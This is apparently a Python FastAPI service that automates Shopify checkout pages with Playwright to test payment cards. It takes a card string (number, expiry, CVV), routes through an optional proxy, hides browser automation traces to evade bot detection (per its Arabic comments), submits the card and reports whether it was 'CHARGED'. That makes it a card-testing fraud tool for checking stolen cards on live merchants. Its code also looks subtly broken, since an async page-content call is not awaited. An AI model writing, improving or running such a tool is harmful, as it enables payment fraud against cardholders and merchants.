from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
import uvicorn

app = FastAPI()

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    async with async_playwright() as p:
        # إقلاع المتصفح مع خصائص لتجاوز اكتشاف الـ Automation
        browser = await p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
        
        context_args = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720}
        }
        if proxy:
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        
        # إضافة JavaScript لإخفاء بصمة الأتمتة
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        page = await context.new_page()
        
        try:
            # استخدام wait_until="domcontentloaded" لتسريع التحميل وتجاوز الـ Timeout
            await page.goto(f"{site}/checkout", timeout=60000, wait_until="domcontentloaded")
            
            # محاولة تعبئة الحقول
            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
            await frame.locator('input[name="number"]').fill(cc.split('|')[0])
            await frame.locator('input[name="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
            await frame.locator('input[name="verification_value"]').fill(cc.split('|')[3])
            
            await page.locator('button#continue-button').click()
            await page.wait_for_load_state("networkidle", timeout=10000)
            
            content = page.content().lower()
            error_element = page.locator('.notice--error, .field__message--error').first
            raw_error = (await error_element.text_content()).strip() if await error_element.count() > 0 else ""

            status = "true" if "thank-you" in page.url or "success" in content else "false"
            response = "CHARGED" if status == "true" else (raw_error if raw_error else "CARD_DECLINED")
            
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": response, "Status": status, "CC": cc}
            
        except Exception as e:
            await browser.close()
            error_msg = str(e)
            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": error_msg, "Status": "false", "CC": cc}
